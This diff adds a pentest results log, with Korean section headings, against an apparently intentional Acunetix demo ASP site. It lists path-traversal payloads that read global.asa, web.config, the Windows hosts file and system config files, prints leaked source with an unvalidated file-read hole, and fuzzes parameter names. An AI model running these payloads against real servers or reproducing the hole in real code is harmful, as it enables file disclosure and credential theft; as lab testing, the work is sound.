@@ -1,0 +1,66 @@
+### C. 추가 민감 파일 읽기 (Templatize.asp?item=)
+LABEL                    PATH                                                 CODE SIZE
+global_asa_root          global.asa                                           500 1208
+globalasa_via_html       html/../global.asa                                   500 1208
+globalasa_dot            ./global.asa                                         500 1208
+webconfig_root           web.config                                           200 3138
+logs_dir_webconfig       html/../logs/web.config                              500 1208
+apphost_webconfig        ../web.config                                        500 1208
+connstr_asa              /global.asa                                          500 1208
+mtemplates               Templates/MainTemplate.dwt.asp                       200 5598
+loginput_via_html        html/../logInput.asp                                 200 3578
+hosts_recheck            ..%2f..%2f..%2f..%2fwindows%2fsystem32%2fdrivers%2fetc%2fhosts 200 3629
+inetsrv_meta             ..%2f..%2f..%2fwindows%2fsystem32%2finetsrv%2fconfig%2fapplicationHost.config 500 1208
+win_backup               ..%2f..%2f..%2fwindows%2fwin.ini.bak                 500 1208
+bootini                  ..%2f..%2fboot.ini                                   500 1208
+scripts_log              ..%2f..%2f..%2fscripts%2flogInput.txt                500 1208
+
+### D. shownews.asp — 자체 소스에서 파라미터명 확인 + 라이브 오라클
+-- 소스(Templatize 경유) 중 FName 설정부 --
+ charset=iso-8859-1">
+<!-- InstanceBeginEditable name="head" --><!-- InstanceEndEditable -->
+<link href="styles.css" rel="stylesheet" type="text/css">
+</head>
+<body> 
+<table width="100%"  border="0" cellpadding="10" cellspacing="0"> 
+  <tr bgcolor="#008F00"> 
+    <td width="306px"><a href="https://www.acunetix.com/"><img src="Images/logo.gif" width="306" height="38" border="0" alt="Acunetix website security"></a></td> 
+    <td align="right" valign="middle" bgcolor="#008F00" class="disclaimer">TEST and Demonstration site for <a href="https://www.acunetix.com/vulnerability-scanner/">Acunetix Web Vulnerability Scanner</a></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><div class="menubar"><a href="Templatize.asp?item=html/about.html" class="menu">about</a> - <a href="Default.asp" class="menu">forums</a> - <a href="Search.asp" class="menu">search</a> 
+     - <a href="./Login.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dshownews%2Easp" class="menu">login</a> - <a href="./Register.asp?RetURL=%2FTemplatize%2Easp%3Fitem%3Dshownews%2Easp" class="menu">register</a> 
+	- <a href="https://www.acunetix.com/vulnerability-scanner/sql-injection/" class="menu">SQL scanner</a> - <a href="https://www.acunetix.com/websitesecurity/sql-injection/" class="menu">SQL vuln help</a>
+    </div></td> 
+  </tr> 
+  <tr> 
+    <td colspan="2"><!-- InstanceBeginEditable name="MainContentLeft" -->
+		<%
+  Dim oFileSys, oFile
+  'On Error Resume Next
+  
+  Set oFileSys = Server.CreateObject("Scripting.FileSystemObject")  
+  FName = Server.MapPath(".") & "\" & Request.QueryString("item") 
+ 
+  Set oFile = oFileSys.OpenTextFile (FName, 1, False, 0) 
+  
+  If (IsObject(oFile)) Then
+    'On Error Resume Next
+    Response.Write Server.HTMLEncode(oFile.ReadAll)
+    oFile.Close
+  End If
+%>
+
+
+		<!-- InstanceEndEditable --></td> 
+  </tr> 
+  <tr align="right" bgcolor="#FFFFFF"> 
+    <td colspan="2" class="footer">Copyright 2019 
+/shownews.asp                                  500 1208
+/shownews.asp?id=1                             500 1208
+/shownews.asp?newsid=1                         500 1208
+/shownews.asp?fname=html/about.html            500 1208
+/shownews.asp?file=html/about.html             500 1208
+/shownews.asp?item=html/about.html             200 2161
+/shownews.asp?n=1                              500 1208
+/shownews.asp?note=1                           500 1208
